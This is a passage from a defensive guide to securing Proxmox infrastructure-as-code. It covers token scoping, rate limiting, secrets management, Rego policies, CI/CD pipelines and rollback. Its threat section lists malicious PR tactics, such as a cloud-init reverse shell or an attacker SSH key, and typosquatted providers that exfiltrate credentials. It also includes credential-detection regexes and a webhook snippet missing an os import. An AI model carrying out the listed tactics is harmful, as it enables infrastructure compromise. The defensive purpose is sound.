pveum role add TerraformProvisioner --privs \
  "VM.Allocate VM.Clone VM.Config.Disk VM.Config.CPU VM.Config.Memory \
   VM.Config.Network VM.Config.Options VM.PowerMgmt VM.Monitor \
   Datastore.AllocateSpace Datastore.Audit \
   SDN.Use Sys.Audit Sys.Modify"

# Assign role on specific paths -- NOT at root
pveum acl modify /vms --roles TerraformProvisioner --tokens terraform@pve!iac-token
pveum acl modify /storage/local-zfs --roles TerraformProvisioner --tokens terraform@pve!iac-token
pveum acl modify /storage/encrypted-zfs --roles TerraformProvisioner --tokens terraform@pve!iac-token
```

### 4.3 API Token Scoping -- Least Privilege for Automation

Different automation tools need different privilege levels. A single omnipotent token shared across Terraform, Ansible, monitoring, and backup is a blast radius problem.

**Token strategy:**

| Token | User | Privilege Separation | Role | Paths |
|-------|------|---------------------|------|-------|
| `iac-token` | terraform@pve | Yes | TerraformProvisioner | /vms, /storage |
| `automation` | ansible@pve | Yes | AnsibleOperator | /vms, /nodes |
| `inventory` | ansible@pve | Yes | PVEAuditor | / (read-only) |
| `monitoring` | monitor@pve | Yes | PVEAuditor | / (read-only) |
| `backup` | backup@pve | Yes | BackupOperator | /vms, /storage |

**Privilege separation (`--privsep`):** When set to `1`, the token's effective permissions are the intersection of the user's permissions and the token's ACL assignments. When set to `0`, the token inherits all of the user's permissions. Always set `--privsep 1` for automation tokens so token permissions can be independently scoped below the user level.

### 4.4 Rate Limiting and Abuse Prevention

Proxmox does not ship with built-in API rate limiting. This must be implemented externally.

**Reverse proxy rate limiting with nginx:**

```nginx
# /etc/nginx/conf.d/pve-api-ratelimit.conf

# Define rate limit zones
limit_req_zone $binary_remote_addr zone=pve_api:10m rate=30r/s;
limit_req_zone $binary_remote_addr zone=pve_auth:10m rate=5r/m;

upstream proxmox_api {
    server 127.0.0.1:8006;
}

server {
    listen 443 ssl http2;
    server_name pve-api.internal;

    ssl_certificate     /etc/ssl/pve-api/fullchain.pem;
    ssl_certificate_key /etc/ssl/pve-api/privkey.pem;
    ssl_protocols       TLSv1.3;

    # Auth endpoint -- strict rate limiting (brute force prevention)
    location /api2/json/access/ticket {
        limit_req zone=pve_auth burst=3 nodelay;
        limit_req_status 429;
        proxy_pass https://proxmox_api;
    }

    # General API -- moderate rate limiting
    location /api2/ {
        limit_req zone=pve_api burst=50 nodelay;
        limit_req_status 429;
        proxy_pass https://proxmox_api;
    }

    # Block direct access to pveproxy from outside
    # Only allow through this reverse proxy
}
```

Additionally, use `fail2ban` to detect and block brute-force authentication attempts:

```ini
# /etc/fail2ban/jail.d/proxmox.conf
[proxmox]
enabled  = true
port     = https,8006
filter   = proxmox
logpath  = /var/log/daemon.log
maxretry = 3
bantime  = 3600
findtime = 600
```

### 4.5 TLS Configuration for API

Proxmox uses self-signed certificates by default. For production, replace them with certificates from an internal CA or a public CA.

```bash
# Replace Proxmox self-signed certificate with CA-signed certificate
cp /path/to/signed-cert.pem /etc/pve/nodes/$(hostname)/pveproxy-ssl.pem
cp /path/to/private-key.pem /etc/pve/nodes/$(hostname)/pveproxy-ssl.key
chmod 0640 /etc/pve/nodes/$(hostname)/pveproxy-ssl.key
chown root:www-data /etc/pve/nodes/$(hostname)/pveproxy-ssl.key

# Harden TLS configuration
cat >> /etc/default/pveproxy <<'EOF'
CIPHERS="ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305"
HONOR_CIPHER_ORDER=1
# TLS 1.3 only (requires OpenSSL 1.1.1+)
# OPENSSL_NO_TLS1=1
# OPENSSL_NO_TLS1_1=1
EOF

systemctl restart pveproxy
```

**Verification:**

```bash
# Test TLS configuration
openssl s_client -connect pve.internal:8006 -tls1_3 </dev/null 2>/dev/null | \
  openssl x509 -noout -dates -subject -issuer
```

### 4.6 Webhook Security for Event-Driven Automation

Proxmox 8.x supports webhook-based notifications for events (VM state changes, backup completion, cluster events). Securing these webhooks prevents unauthorized trigger of automation.

**Secure webhook patterns:**

1. **HMAC signature verification.** Include a shared secret and compute HMAC-SHA256 of the payload. The receiver verifies the signature before processing.

```python
# Webhook receiver -- verify HMAC signature
import hmac
import hashlib
from flask import Flask, request, abort

app = Flask(__name__)
WEBHOOK_SECRET = os.environ["PVE_WEBHOOK_SECRET"]  # Never hardcoded

@app.route("/webhook/pve", methods=["POST"])
def pve_webhook():
    signature = request.headers.get("X-PVE-Signature")
    if not signature:
        abort(401)

    expected = hmac.new(
        WEBHOOK_SECRET.encode(),
        request.data,
        hashlib.sha256
    ).hexdigest()

    if not hmac.compare_digest(signature, expected):
        abort(403)

    # Process event
    event = request.get_json()
    handle_pve_event(event)
    return "", 200
```

2. **IP allowlisting.** Only accept webhook requests from known Proxmox node IPs.
3. **TLS mutual authentication.** Require the Proxmox node to present a client certificate.
4. **Idempotent event handlers.** Webhooks may be delivered more than once. Handlers must be safe to re-execute.

---

## 5. Secrets Management for IaC

### 5.1 Terraform Vault Provider -- Dynamic Credentials for Proxmox

HashiCorp Vault can generate short-lived Proxmox API credentials dynamically, eliminating long-lived static tokens.

**Vault configuration for Proxmox secrets:**

```hcl
# Enable KV secrets engine for Proxmox credentials
resource "vault_mount" "proxmox" {
  path        = "proxmox"
  type        = "kv"
  options     = { version = "2" }
  description = "Proxmox VE credentials"
}

# Store Proxmox API token in Vault
resource "vault_kv_secret_v2" "proxmox_terraform" {
  mount               = vault_mount.proxmox.path
  name                = "terraform/api-token"
  delete_all_versions = false

  data_json = jsonencode({
    token_id     = "terraform@pve!iac-token"
    token_secret = var.initial_proxmox_token  # Rotated after initial setup
  })
}
```

**Reading Proxmox credentials from Vault in Terraform:**

```hcl
provider "vault" {
  address = "https://vault.internal:8200"
  # Auth via OIDC, AppRole, or Kubernetes -- never static root token
}

data "vault_kv_secret_v2" "proxmox_creds" {
  mount = "proxmox"
  name  = "terraform/api-token"
}

provider "proxmox" {
  pm_api_url          = "https://pve-mgmt.internal:8006/api2/json"
  pm_api_token_id     = data.vault_kv_secret_v2.proxmox_creds.data["token_id"]
  pm_api_token_secret = data.vault_kv_secret_v2.proxmox_creds.data["token_secret"]
  pm_tls_insecure     = false
}
```

**Vault transit engine for state file encryption:**

```hcl
# Use Vault transit engine to encrypt Terraform state at rest
resource "vault_transit_secret_backend_key" "terraform_state" {
  backend    = "transit"
  name       = "terraform-state-key"
  type       = "aes256-gcm96"
  exportable = false

  # Prevent key deletion to avoid state inaccessibility
  deletion_allowed = false
}
```

### 5.2 Ansible Vault -- Encrypting Variables and Using vault Lookup

Ansible Vault encrypts variables, files, or entire variable files at rest using AES-256-CTR.

**Encrypting a variables file:**

```bash
# Encrypt the file containing Proxmox API credentials
ansible-vault encrypt group_vars/proxmox_nodes/vault.yml

# View encrypted contents (requires vault password)
ansible-vault view group_vars/proxmox_nodes/vault.yml

# Edit encrypted file in-place
ansible-vault edit group_vars/proxmox_nodes/vault.yml
```

**Encrypted variable file (`group_vars/proxmox_nodes/vault.yml`):**

```yaml
---
# This file is encrypted with ansible-vault
vault_proxmox_api_token_secret: "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
vault_proxmox_root_password: "REDACTED"
vault_backup_encryption_key: "REDACTED"
```

**Using HashiCorp Vault lookup in Ansible:**

```yaml
---
- name: Provision with Vault-sourced credentials
  hosts: localhost
  vars:
    proxmox_token_secret: "{{ lookup('community.hashi_vault.hashi_vault',
      'secret=proxmox/data/terraform/api-token:token_secret
       url=https://vault.internal:8200
       auth_method=token') }}"
  tasks:
    - name: Create VM using Vault-sourced credentials
      community.general.proxmox_kvm:
        api_host: "pve-mgmt.internal"
        api_token_id: "ansible@pve!automation"
        api_token_secret: "{{ proxmox_token_secret }}"
        # ... resource configuration
```

### 5.3 Environment Variable Injection -- Secure Patterns

Environment variables are the simplest credential injection mechanism. Done correctly, they avoid hardcoding. Done incorrectly, they leak into process listings, logs, and crash dumps.

**Secure patterns:**

```bash
# GOOD: source from a restricted file
set -a
source /etc/terraform/proxmox.env  # mode 0400, owned by ci-runner
set +a
terraform plan

# GOOD: use a secrets manager CLI to inject
export TF_VAR_proxmox_api_token_secret=$(vault kv get -field=token_secret proxmox/terraform/api-token)
terraform apply

# BAD: visible in process listing
terraform apply -var="proxmox_api_token_secret=xxxxx"  # visible in /proc/*/cmdline

# BAD: persisted in shell history
export TF_VAR_proxmox_api_token_secret=actual-secret-value  # in ~/.bash_history
```

**CI/CD environment variable security:**

```yaml
# GitLab CI -- use masked and protected variables
variables:
  TF_VAR_proxmox_api_token_secret:
    value: ""  # Set in GitLab CI/CD settings, not here
    masked: true
    protected: true
```

### 5.4 SOPS for Encrypted Secrets in Git

Mozilla SOPS (Secrets OPerationS) encrypts values within structured files (YAML, JSON, INI) while leaving keys in plaintext. This allows meaningful git diffs on encrypted files.

**`.sops.yaml` configuration:**

```yaml
creation_rules:
  - path_regex: .*secrets\.ya?ml$
    age: >-
      age1xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
    # Or use PGP/AWS KMS/GCP KMS/Azure Key Vault
  - path_regex: .*\.env\.enc$
    age: >-
      age1xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

**Encrypting a secrets file:**

```bash
# Create plaintext secrets file
cat > proxmox-secrets.yaml <<'EOF'
proxmox:
  api_token_secret: "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
  backup_passphrase: "REDACTED"
EOF

# Encrypt with SOPS -- keys remain readable, values encrypted
sops --encrypt --in-place proxmox-secrets.yaml
```

**Result (git-friendly -- keys visible, values encrypted):**

```yaml
proxmox:
    api_token_secret: ENC[AES256_GCM,data:xxxx,iv:xxxx,tag:xxxx,type:str]
    backup_passphrase: ENC[AES256_GCM,data:xxxx,iv:xxxx,tag:xxxx,type:str]
sops:
    age:
        - recipient: age1xxxxxxx
          enc: |
            -----BEGIN AGE ENCRYPTED FILE-----
            ...
            -----END AGE ENCRYPTED FILE-----
    lastmodified: "2026-05-07T10:00:00Z"
    version: 3.8.1
```

**Using SOPS-encrypted values in Terraform:**

```hcl
data "sops_file" "proxmox_secrets" {
  source_file = "proxmox-secrets.yaml"
}

provider "proxmox" {
  pm_api_token_secret = data.sops_file.proxmox_secrets.data["proxmox.api_token_secret"]
}
```

### 5.5 External Secret Managers -- HashiCorp Vault and CyberArk Conjur Integration

**HashiCorp Vault -- AppRole authentication for CI/CD:**

```bash
# Configure AppRole auth method
vault auth enable approle

vault write auth/approle/role/terraform-proxmox \
  secret_id_ttl=10m \
  token_ttl=20m \
  token_max_ttl=30m \
  token_policies="terraform-proxmox" \
  bind_secret_id=true \
  secret_id_num_uses=1

# Policy for Terraform Proxmox access
vault policy write terraform-proxmox - <<'EOF'
path "proxmox/data/terraform/*" {
  capabilities = ["read"]
}
path "transit/encrypt/terraform-state-key" {
  capabilities = ["update"]
}
path "transit/decrypt/terraform-state-key" {
  capabilities = ["update"]
}
EOF
```

**CyberArk Conjur integration:**

```yaml
# Ansible playbook using Conjur lookup
---
- name: Provision with Conjur-sourced credentials
  hosts: localhost
  vars:
    proxmox_token: "{{ lookup('cyberark.conjur.conjur_variable',
      'infrastructure/proxmox/terraform-token',
      config_file='/etc/conjur.conf',
      identity_file='/etc/conjur.identity') }}"
  tasks:
    - name: Use Conjur-sourced credential
      community.general.proxmox_kvm:
        api_token_secret: "{{ proxmox_token }}"
        # ...
```

### 5.6 Avoiding Hardcoded Credentials -- Detection and Prevention

**Pre-commit hook for credential detection:**

```bash
#!/usr/bin/env bash
# .git/hooks/pre-commit or via pre-commit framework

# Patterns that indicate hardcoded credentials
PATTERNS=(
  'pm_password\s*=\s*"[^{]'
  'api_token_secret\s*=\s*"[0-9a-f]'
  'password\s*=\s*"[^{$]'
  'BEGIN\s+(RSA|DSA|EC|OPENSSH)\s+PRIVATE\s+KEY'
  'AKIA[0-9A-Z]{16}'  # AWS access key
)

FOUND=0
for pattern in "${PATTERNS[@]}"; do
  if git diff --cached --diff-filter=d | grep -P -i "$pattern"; then
    echo "ERROR: Potential hardcoded credential detected: $pattern"
    FOUND=1
  fi
done

if [ $FOUND -ne 0 ]; then
  echo "Commit blocked. Remove hardcoded credentials and use Vault/environment variables."
  exit 1
fi
```

**CI pipeline credential scanning (see also section 7):**

```yaml
# GitLab CI job for secret scanning
secret_scan:
  stage: validate
  image: ghcr.io/trufflesecurity/trufflehog:latest
  script:
    - trufflehog filesystem --directory=. --fail --json > trufflehog-report.json
  artifacts:
    reports:
      secret_detection: trufflehog-report.json
    when: always
  allow_failure: false
```

---

## 6. Policy as Code for Virtual Infrastructure

### 6.1 OPA/Rego for Terraform -- Conftest and Sentinel

Policy as Code validates infrastructure changes against organizational rules before those changes are applied. This shifts security enforcement left -- violations are caught during `terraform plan`, not after deployment.

**Workflow with Conftest (open-source, uses OPA/Rego):**

```bash
# Generate plan JSON for policy evaluation
terraform plan -out=tfplan.binary
terraform show -json tfplan.binary > tfplan.json

# Evaluate policies against the plan
conftest test tfplan.json --policy policy/ --output json
```

Conftest evaluates the `tfplan.json` output, not raw HCL. The JSON plan contains the planned resource changes, which is what policies validate.

**Sentinel (Terraform Cloud/Enterprise):**

Sentinel policies run automatically between plan and apply in TFC/TFE. They use the Sentinel language rather than Rego.

```python
# sentinel/require-encrypted-storage.sentinel
import "tfplan/v2" as tfplan

main = rule {
  all tfplan.resource_changes as _, rc {
    rc.type is "proxmox_vm_qemu" implies
    all rc.change.after.disks as _, disk_config {
      disk_config.storage contains "encrypted"
    }
  }
}
```

### 6.2 Resource Naming Conventions Enforcement

```rego
# policy/naming.rego
package terraform.naming

import rego.v1

# Deny VMs that don't follow naming convention: <role>-<env>-<nn>
deny contains msg if {
    some resource in input.resource_changes
    resource.type == "proxmox_vm_qemu"
    name := resource.change.after.name
    not regex.match(`^[a-z]+-(?:prod|staging|dev)-\d{2}$`, name)
    msg := sprintf(
        "VM '%s' does not follow naming convention <role>-<env>-<nn>. Got: %s",
        [resource.address, name]
    )
}

# Deny LXC containers without proper naming
deny contains msg if {
    some resource in input.resource_changes
    resource.type == "proxmox_lxc"
    hostname := resource.change.after.hostname
    not regex.match(`^[a-z]+-(?:prod|staging|dev)-\d{2}$`, hostname)
    msg := sprintf(
        "Container '%s' hostname does not follow naming convention. Got: %s",
        [resource.address, hostname]
    )
}
```

### 6.3 Security Group and Firewall Rule Validation

```rego
# policy/firewall.rego
package terraform.firewall

import rego.v1

# Deny VMs on management VLAN without explicit justification tag
deny contains msg if {
    some resource in input.resource_changes
    resource.type == "proxmox_vm_qemu"
    some net in resource.change.after.network
    net.tag == 999  # Management VLAN
    tags := resource.change.after.tags
    not contains(tags, "management-approved")
    msg := sprintf(
        "VM '%s' placed on management VLAN (999) without 'management-approved' tag",
        [resource.address]
    )
}

# Deny VMs with network interfaces on both WAN and internal bridges
deny contains msg if {
    some resource in input.resource_changes
    resource.type == "proxmox_vm_qemu"
    nets := resource.change.after.network
    bridges := {net.bridge | some net in nets}
    "vmbr0" in bridges  # WAN bridge
    count(bridges) > 1   # Also on internal bridge
    not contains(resource.change.after.tags, "firewall-vm")
    msg := sprintf(
        "VM '%s' spans WAN and internal bridges without 'firewall-vm' tag -- potential security zone violation",
        [resource.address]
    )
}
```

### 6.4 VM Resource Limit Enforcement

```rego
# policy/resource-limits.rego
package terraform.resource_limits

import rego.v1

# Maximum resources per VM
max_cores := 16
max_memory_mb := 65536
max_disk_gb := 2000

deny contains msg if {
    some resource in input.resource_changes
    resource.type == "proxmox_vm_qemu"
    cores := resource.change.after.cores
    cores > max_cores
    msg := sprintf(
        "VM '%s' requests %d cores (max: %d)",
        [resource.address, cores, max_cores]
    )
}

deny contains msg if {
    some resource in input.resource_changes
    resource.type == "proxmox_vm_qemu"
    memory := resource.change.after.memory
    memory > max_memory_mb
    msg := sprintf(
        "VM '%s' requests %dMB memory (max: %dMB)",
        [resource.address, memory, max_memory_mb]
    )
}
```

### 6.5 Tag Compliance Checking

```rego
# policy/tags.rego
package terraform.tags

import rego.v1

required_tags := {"terraform", "owner", "environment"}

deny contains msg if {
    some resource in input.resource_changes
    resource.type in {"proxmox_vm_qemu", "proxmox_lxc"}
    resource.change.actions[_] in ["create", "update"]
    tags_str := resource.change.after.tags
    present_tags := {t | some t in split(tags_str, ",")}
    missing := required_tags - present_tags
    count(missing) > 0
    msg := sprintf(
        "Resource '%s' missing required tags: %v",
        [resource.address, missing]
    )
}
```

### 6.6 Custom Validation Rules

**Preventing privileged containers:**

```rego
# policy/container-security.rego
package terraform.container_security

import rego.v1

# CRITICAL: deny privileged LXC containers
deny contains msg if {
    some resource in input.resource_changes
    resource.type == "proxmox_lxc"
    resource.change.after.unprivileged == false
    msg := sprintf(
        "SECURITY VIOLATION: Container '%s' is privileged. All containers MUST be unprivileged unless explicitly exempted.",
        [resource.address]
    )
}

# Deny containers with dangerous mount features
deny contains msg if {
    some resource in input.resource_changes
    resource.type == "proxmox_lxc"
    features := resource.change.after.features[_]
    features.mount != ""
    not features.mount in {"", "nfs", "cifs"}
    msg := sprintf(
        "Container '%s' has unrestricted mount feature enabled",
        [resource.address]
    )
}
```

**Enforcing encryption:**

```rego
# policy/encryption.rego
package terraform.encryption

import rego.v1

encrypted_storage_pools := {"encrypted-zfs", "encrypted-lvm"}

deny contains msg if {
    some resource in input.resource_changes
    resource.type == "proxmox_vm_qemu"
    contains(resource.change.after.tags, "pci-scope")
    some disk_config in resource.change.after.disks
    not disk_config.storage in encrypted_storage_pools
    msg := sprintf(
        "PCI-scoped VM '%s' uses non-encrypted storage '%s'",
        [resource.address, disk_config.storage]
    )
}
```

**Requiring specific network configuration:**

```rego
# policy/network-policy.rego
package terraform.network

import rego.v1

# Production VMs must be on VLAN-tagged interfaces
deny contains msg if {
    some resource in input.resource_changes
    resource.type == "proxmox_vm_qemu"
    contains(resource.change.after.tags, "production")
    some net in resource.change.after.network
    not net.tag  # No VLAN tag
    msg := sprintf(
        "Production VM '%s' has untagged network interface on bridge '%s'. Production VMs must use VLAN tagging.",
        [resource.address, net.bridge]
    )
}
```

**Running all policies:**

```bash
# Evaluate all policies in the policy directory
conftest test tfplan.json \
  --policy policy/ \
  --all-namespaces \
  --output json \
  | jq '.[] | select(.failures | length > 0)'

# Exit code is non-zero if any deny rules fire -- blocks the pipeline
```

---

## 7. CI/CD for Infrastructure

### 7.1 GitOps Workflow for Proxmox -- Flux/ArgoCD Patterns Adapted for VM Infrastructure

Flux and ArgoCD are designed for Kubernetes GitOps. Their patterns can be adapted for VM infrastructure using custom controllers or CI/CD pipelines that implement the same principles.

**Core GitOps principles applied to VM infrastructure:**

1. **Declarative.** Infrastructure is described declaratively in git (Terraform HCL, Ansible YAML).
2. **Versioned and immutable.** Git history is the audit log. Tags mark deployed versions.
3. **Pulled automatically.** The CI/CD pipeline watches the repository and applies changes.
4. **Continuously reconciled.** Periodic drift checks compare actual state to git.

**Adapted workflow:**

```
Developer -> Git Branch -> PR + Review -> Merge to main
                                              |
                                    CI Pipeline triggers
                                              |
                              +---------+---------+---------+
                              |         |         |         |
                           Validate   Scan    Test Plan  Policy
                              |         |         |         |
                              +---------+---------+---------+
                                              |
                                    Manual Approval Gate
                                              |
                                       Terraform Apply
                                              |
                                    Ansible Post-Config
                                              |
                                   Verification Tests
                                              |
                                    Drift Check Scheduled
```

### 7.2 Pipeline Security -- Runner Hardening, Approval Gates, and Environment Promotion

**GitLab CI pipeline for Proxmox infrastructure:**

```yaml
# .gitlab-ci.yml
stages:
  - validate
  - security
  - plan
  - approve
  - apply
  - configure
  - verify

variables:
  TF_ROOT: "${CI_PROJECT_DIR}/terraform/proxmox"
  ANSIBLE_ROOT: "${CI_PROJECT_DIR}/ansible"

# --- VALIDATE STAGE ---
terraform_validate:
  stage: validate
  image:
    name: hashicorp/terraform:1.7
    entrypoint: [""]
  script:
    - cd ${TF_ROOT}
    - terraform init -backend=false
    - terraform validate
    - terraform fmt -check -recursive
  rules:
    - changes:
        - terraform/**/*

ansible_lint:
  stage: validate
  image: cytopia/ansible-lint:latest
  script:
    - cd ${ANSIBLE_ROOT}
    - ansible-lint playbooks/ roles/

# --- SECURITY STAGE ---
secret_scan:
  stage: security
  image: ghcr.io/trufflesecurity/trufflehog:latest
  script:
    - trufflehog filesystem --directory=. --fail
  allow_failure: false

tfsec_scan:
  stage: security
  image: aquasec/tfsec:latest
  script:
    - tfsec ${TF_ROOT} --format json --out tfsec-report.json
  artifacts:
    reports:
      terraform: tfsec-report.json
    when: always

policy_check:
  stage: security
  image:
    name: openpolicyagent/conftest:latest
    entrypoint: [""]
  script:
    - cd ${TF_ROOT}
    - terraform init
    - terraform plan -out=tfplan.binary
    - terraform show -json tfplan.binary > tfplan.json
    - conftest test tfplan.json --policy ${CI_PROJECT_DIR}/policy/ --all-namespaces
  allow_failure: false

# --- PLAN STAGE ---
terraform_plan:
  stage: plan
  image:
    name: hashicorp/terraform:1.7
    entrypoint: [""]
  script:
    - cd ${TF_ROOT}
    - terraform init
    - terraform plan -out=tfplan.binary -input=false
    - terraform show tfplan.binary > tfplan.txt
    - terraform show -json tfplan.binary > tfplan.json
  artifacts:
    paths:
      - ${TF_ROOT}/tfplan.binary
      - ${TF_ROOT}/tfplan.txt
      - ${TF_ROOT}/tfplan.json
    expire_in: 1 hour
  rules:
    - changes:
        - terraform/**/*

# --- APPROVAL GATE ---
manual_approval:
  stage: approve
  script:
    - echo "Plan approved by ${GITLAB_USER_LOGIN} at $(date -u +%Y-%m-%dT%H:%M:%SZ)"
  when: manual
  allow_failure: false
  environment:
    name: production
  rules:
    - if: $CI_COMMIT_BRANCH == "main"

# --- APPLY STAGE ---
terraform_apply:
  stage: apply
  image:
    name: hashicorp/terraform:1.7
    entrypoint: [""]
  script:
    - cd ${TF_ROOT}
    - terraform init
    - terraform apply -input=false tfplan.binary
  dependencies:
    - terraform_plan
  needs:
    - terraform_plan
    - manual_approval
  environment:
    name: production
  rules:
    - if: $CI_COMMIT_BRANCH == "main"

# --- CONFIGURE STAGE ---
ansible_configure:
  stage: configure
  image: cytopia/ansible:latest
  script:
    - cd ${ANSIBLE_ROOT}
    - ansible-playbook -i inventory/proxmox.yml playbooks/hardening.yml
    - ansible-playbook -i inventory/proxmox.yml playbooks/monitoring-agent.yml
  needs:
    - terraform_apply
  environment:
    name: production

# --- VERIFY STAGE ---
infrastructure_test:
  stage: verify
  image: chef/inspec:latest
  script:
    - inspec exec profiles/proxmox-baseline --target ssh://deploy@pve-node-01 --reporter json:inspec-results.json
  artifacts:
    reports:
      junit: inspec-results.json
    when: always
  needs:
    - ansible_configure

drift_check:
  stage: verify
  image: cytopia/ansible:latest
  script:
    - cd ${ANSIBLE_ROOT}
    - ansible-playbook -i inventory/proxmox.yml playbooks/hardening.yml --check --diff
  needs:
    - ansible_configure
  allow_failure: true  # Drift detected = warning, not failure
```

**Runner hardening:**

- Use ephemeral/disposable runners that are destroyed after each job. No persistent runner state.
- Run runners in isolated VMs or containers with no access to production networks except through defined CI/CD credential injection.
- Restrict runner tags so that production-targeting jobs only run on hardened, audited runners.
- Enable runner isolation: no shared volumes, no Docker socket mounting, no host networking.

**Environment promotion:**

```yaml
# Environment-specific variable files
# terraform/proxmox/environments/
#   dev.tfvars
#   staging.tfvars
#   production.tfvars

# Promotion: dev -> staging -> production
# Each environment requires its own approval gate
```

### 7.3 Infrastructure Testing -- Terratest, InSpec, and ServerSpec

**Terratest (Go-based Terraform testing):**

```go
// test/proxmox_vm_test.go
package test

import (
    "testing"
    "github.com/gruntwork-io/terratest/modules/terraform"
    "github.com/stretchr/testify/assert"
)

func TestProxmoxVMProvisioning(t *testing.T) {
    t.Parallel()

    terraformOptions := &terraform.Options{
        TerraformDir: "../terraform/proxmox",
        VarFiles:     []string{"environments/test.tfvars"},
    }

    defer terraform.Destroy(t, terraformOptions)
    terraform.InitAndApply(t, terraformOptions)

    // Verify VM was created with correct parameters
    vmName := terraform.Output(t, terraformOptions, "vm_name")
    assert.Equal(t, "web-test-01", vmName)

    vmCores := terraform.Output(t, terraformOptions, "vm_cores")
    assert.Equal(t, "4", vmCores)
}
```

**InSpec compliance profile:**

```ruby
# profiles/proxmox-baseline/controls/ssh.rb
control 'ssh-01' do
  impact 1.0
  title 'SSH root login must be restricted'
  desc 'Root login via SSH must use key-based authentication only'

  describe sshd_config do
    its('PermitRootLogin') { should eq 'prohibit-password' }
    its('PasswordAuthentication') { should eq 'no' }
    its('Protocol') { should eq '2' }
    its('MaxAuthTries') { should cmp <= 3 }
    its('LoginGraceTime') { should cmp <= 60 }
  end
end

control 'ssh-02' do
  impact 0.7
  title 'SSH uses strong ciphers only'
  desc 'Weak ciphers must be disabled'

  describe sshd_config do
    its('Ciphers') { should_not include 'arcfour' }
    its('Ciphers') { should_not include '3des' }
    its('MACs') { should_not include 'hmac-md5' }
  end
end

# profiles/proxmox-baseline/controls/kernel.rb
control 'kernel-01' do
  impact 1.0
  title 'Kernel hardening parameters must be set'

  describe kernel_parameter('net.ipv4.conf.all.rp_filter') do
    its('value') { should eq 1 }
  end

  describe kernel_parameter('kernel.dmesg_restrict') do
    its('value') { should eq 1 }
  end

  describe kernel_parameter('kernel.kptr_restrict') do
    its('value') { should eq 2 }
  end
end
```

**ServerSpec tests:**

```ruby
# spec/proxmox_node/firewall_spec.rb
require 'spec_helper'

describe file('/etc/pve/local/host.fw') do
  it { should exist }
  it { should be_owned_by 'root' }
  its(:content) { should match(/policy_in: DROP/) }
end

describe port(8006) do
  it { should be_listening.with('tcp') }
end

describe port(22) do
  it { should be_listening.with('tcp') }
end

# Verify no unexpected listening ports
describe command('ss -tlnp | grep -v "8006\|22\|3128\|5900"') do
  its(:stdout) { should be_empty }
end
```

### 7.4 Blue-Green Deployment for Infrastructure Changes

Blue-green deployment for infrastructure means provisioning a complete parallel set of resources, verifying them, and then cutting over traffic/references.

**Implementation pattern with Terraform workspaces:**

```hcl
# Use workspace to manage blue/green environments
# terraform workspace new green
# terraform workspace select green

variable "deployment_color" {
  type    = string
  default = "blue"  # Or "green" -- toggled by CI/CD
}

resource "proxmox_vm_qemu" "web_server" {
  count       = 2
  name        = "web-${var.deployment_color}-${format("%02d", count.index + 1)}"
  target_node = "pve-node-01"
  clone       = var.vm_template  # New template version for green

  network {
    model  = "virtio"
    bridge = "vmbr1"
    tag    = var.deployment_color == "blue" ? 100 : 101  # Separate VLANs
  }

  tags = "terraform,${var.environment},web,${var.deployment_color}"
}
```

**Cutover process:**

1. Deploy green environment alongside blue.
2. Run verification tests against green.
3. Update load balancer / DNS to point to green.
4. Monitor green for a defined soak period.
5. If successful, destroy blue.
6. If failed, revert load balancer / DNS to blue (instant rollback).

### 7.5 Rollback Procedures for Failed Infrastructure Changes

**Terraform rollback:**

```bash
# Option 1: Revert the git commit and re-apply
git revert HEAD
terraform plan
terraform apply

# Option 2: Apply from a known-good state
git checkout v1.2.3 -- terraform/
terraform plan
terraform apply

# Option 3: Target specific resources for rollback
terraform apply -target=proxmox_vm_qemu.web_server -replace=proxmox_vm_qemu.web_server
```

**State-based rollback (emergency):**

```bash
# List state versions (if using versioned backend like S3)
aws s3api list-object-versions \
  --bucket infra-terraform-state \
  --prefix proxmox/production/terraform.tfstate

# Restore previous state version
aws s3api get-object \
  --bucket infra-terraform-state \
  --key proxmox/production/terraform.tfstate \
  --version-id PREVIOUS_VERSION_ID \
  terraform.tfstate.backup

# Import the backup state (DANGER: coordinate with team, lock state first)
terraform state push terraform.tfstate.backup
terraform plan  # Verify the plan matches desired rollback
terraform apply
```

**Ansible rollback:** Ansible itself does not have built-in rollback. Strategies include:

- Maintain "undo" playbooks that reverse specific changes.
- Use VM snapshots before applying configuration changes and revert on failure.
- Re-run the previous known-good playbook version from git.

---

## 8. Security Risks of IaC

### 8.1 Malicious PR Targeting Infrastructure -- Code Review for IaC

A pull request to an IaC repository is an infrastructure change request. A malicious or compromised contributor can submit a PR that:

- Adds a new VM with an attacker-controlled SSH key.
- Widens firewall rules to allow external access.
- Changes a VM's cloud-init to execute a reverse shell on boot.
- Removes encryption requirements from storage configurations.
- Adds a privileged container with host mount access.

**IaC-specific code review checklist:**

- [ ] No new resources that grant external network access without documented justification.
- [ ] No changes to authentication/authorization configurations.
- [ ] No `ignore_changes` additions on security-relevant attributes.
- [ ] No hardcoded credentials (check `terraform plan` output too).
- [ ] No provider version changes without changelog review.
- [ ] No `local-exec` or `remote-exec` provisioners with arbitrary commands.
- [ ] All new resources pass existing Conftest/Sentinel policies.
- [ ] No changes to backend configuration (state file location, encryption).
- [ ] No `terraform import` commands that bypass the review process.

**Critical: plan output review.** The PR diff alone is insufficient. The `terraform plan` output in the CI pipeline must be reviewed because Terraform interpolation, data sources, and modules can produce effects not visible in the HCL diff.

### 8.2 Supply Chain for Terraform Providers and Ansible Collections

**Terraform provider supply chain risks:**

- **Typosquatting.** An attacker publishes `Telmate/prox-mox` or `Telmate/proxrnox` (rn vs m) on the Terraform Registry. If a developer mistyped the provider source, they pull a malicious provider that exfiltrates credentials.
- **Compromised providers.** A legitimate provider's release pipeline is compromised, injecting malicious code into a new version. The provider runs with the same privileges as Terraform -- it sees all credentials and can modify any managed resource.
- **Abandoned providers.** An unmaintained provider with known vulnerabilities. No patches available.

**Mitigations:**

```hcl
# Pin exact provider versions -- never use ">=" in production
required_providers {
  proxmox = {
    source  = "Telmate/proxmox"
    version = "3.0.1-rc4"  # Exact version, not ~> or >=
  }
}
```

```bash
# Verify provider checksums
terraform providers lock \
  -platform=linux_amd64 \
  -platform=linux_arm64

# The generated .terraform.lock.hcl contains SHA-256 hashes
